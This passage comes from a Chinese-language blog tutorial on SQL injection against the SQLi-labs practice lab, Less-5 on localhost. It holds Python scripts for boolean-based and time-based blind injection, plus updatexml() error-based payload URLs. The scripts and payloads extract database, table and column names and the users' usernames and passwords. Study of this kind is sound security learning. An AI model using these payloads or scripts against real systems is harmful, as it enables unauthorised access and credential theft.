data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230704/St2iv8rimage.7blrrw8yngo.png"></p><p>详情见此博文学习盲注：<a class="link" href="https://www.anquanke.com/post/id/266244#h3-3">点此处跳转<i class="fas fa-external-link-alt"></i></a></p><h2 id="三、布尔盲注和延时盲注WP"><a href="#三、布尔盲注和延时盲注WP" class="headerlink" title="三、布尔盲注和延时盲注WP"></a>三、布尔盲注和延时盲注WP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:C2yb8er</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Boolean_Blind_SQL_Attack</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):  <span class="comment"># 根据输出长度来定</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz_,ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>:</span><br><span class="line">            url = <span class="string">&quot;http://localhost/SQLlabs/Less-5/&quot;</span></span><br><span class="line">            <span class="comment"># 爆数据库名</span></span><br><span class="line">            <span class="comment"># payload = f&quot;?id=1&#x27; and BINARY substr(database(), &#123;j&#125;, 1)=&#x27;&#123;i&#125;&#x27;--+&quot;</span></span><br><span class="line">            <span class="comment"># 爆表名</span></span><br><span class="line">            <span class="comment"># payload = f&quot;?id=1&#x27; and BINARY substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27; --+&quot;</span></span><br><span class="line">            <span class="comment"># 爆列名</span></span><br><span class="line">            <span class="comment"># payload = f&quot;?id=1&#x27; and BINARY substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;), &#123;j&#125;, 1)=&#x27;&#123;i&#125;&#x27;--+&quot;</span></span><br><span class="line">            <span class="comment"># 爆列数据</span></span><br><span class="line">            payload = <span class="string">f&quot;?id=1&#x27; and BINARY substr((select group_concat(username) from users),<span class="subst">&#123;j&#125;</span>,1)=&#x27;<span class="subst">&#123;i&#125;</span>&#x27; --+&quot;</span></span><br><span class="line">            <span class="comment"># payload = f&quot;?id=1&#x27; and BINARY substr((select group_concat(password) from users),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27; --+&quot;</span></span><br><span class="line">            r = requests.get(url + payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                name += i</span><br><span class="line">                <span class="built_in">print</span>(name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;The final result is :<span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Time_Blind_SQL_Attack</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):  <span class="comment"># 根据输出长度来定</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz_,ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>:</span><br><span class="line">            url = <span class="string">&quot;http://localhost/SQLlabs/Less-5/&quot;</span></span><br><span class="line">            <span class="comment"># 爆数据库名</span></span><br><span class="line">            payload = <span class="string">f&quot;?id=1&#x27; and sleep(if(BINARY substr(database(),<span class="subst">&#123;j&#125;</span>,1)=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;,2,0)) --+&quot;</span></span><br><span class="line">            <span class="comment"># 爆表名</span></span><br><span class="line">            <span class="comment"># payload=f&quot;?id=1&#x27; and sleep(if(BINARY substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;,2,0)) --+&quot;</span></span><br><span class="line">            <span class="comment"># 爆列名</span></span><br><span class="line">            <span class="comment"># payload = f&quot;?id=1&#x27; and sleep(if(BINARY substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;,2,0)) --+&quot;</span></span><br><span class="line">            <span class="comment"># 爆列数据名</span></span><br><span class="line">            <span class="comment"># payload = f&quot;?id=1&#x27; and sleep(if(BINARY substr((select group_concat(username) from users),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;,2,0)) --+&quot;</span></span><br><span class="line">            <span class="comment"># payload = f&quot;?id=1&#x27; and sleep(if(BINARY substr((select group_concat(pasword) from users),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;,2,0)) --+&quot;</span></span><br><span class="line">            time1 = datetime.datetime.now()</span><br><span class="line">            r = requests.get(url + payload)</span><br><span class="line">            time2 = datetime.datetime.now()</span><br><span class="line">            sec = (time2 - time1).seconds</span><br><span class="line">            <span class="keyword">if</span> sec &gt;= <span class="number">2</span>:</span><br><span class="line">                name += i</span><br><span class="line">                <span class="built_in">print</span>(name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;The final result is :<span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># Time_Blind_SQL_Attack()</span></span><br><span class="line">    Boolean_Blind_SQL_Attack()</span><br></pre></td></tr></table></figure><h2 id="四、报错注入"><a href="#四、报错注入" class="headerlink" title="四、报错注入"></a>四、报错注入</h2><blockquote><p>方法多如牛毛，这里只看看这几方面：</p></blockquote><h3 id="floor-报错注入"><a href="#floor-报错注入" class="headerlink" title="floor()报错注入"></a>floor()报错注入</h3><h3 id="extractvalue-报错注入"><a href="#extractvalue-报错注入" class="headerlink" title="extractvalue()报错注入"></a>extractvalue()报错注入</h3><blockquote><p>有长度限制,最长32位</p></blockquote><h3 id="updatexml-报错注入"><a href="#updatexml-报错注入" class="headerlink" title="updatexml()报错注入"></a>updatexml()报错注入</h3><blockquote><p>有长度限制,最长32位</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">--------------------查数据库名--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(database()),0x7e),1)--+</span><br><span class="line">--------------------查表名--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1)--+</span><br><span class="line">--------------------查列名--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name=&#x27;users&#x27; ),0x7e),1)--+</span><br><span class="line">--------------------查username--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1)--+</span><br><span class="line">--------------------查password--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-5/</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1)--+</span><br></pre></td></tr></table></figure><p><mark>缺陷就是显示不完全！</mark></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230704/St2iv8rimage.1xecdkis7www.png"></p><h3 id="exp-报错注入"><a href="#exp-报错注入" class="headerlink" title="exp()报错注入"></a>exp()报错注入</h3>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入学习 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
